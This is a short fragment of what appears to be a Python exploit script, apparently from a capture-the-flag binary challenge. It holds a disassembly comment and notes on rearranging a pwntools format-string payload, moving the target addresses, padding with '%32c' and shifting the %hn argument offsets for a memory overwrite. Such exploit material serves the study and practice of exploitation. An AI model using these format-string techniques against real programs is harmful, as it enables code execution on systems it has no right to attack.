...
#getbinary()
#seg000:00000000004004C0                 jmp     qword ptr cs:601020h
...
# get all the addr
addr = payload[:32]
# need %32c to replace the original 4 addr, since fmtstr_payload count length assuming addr in the front
payload = '%32c' + payload[32:]
# %6$hn -> %13$hn need to add one for one addr, here total 4 < 8, so just need to add 1
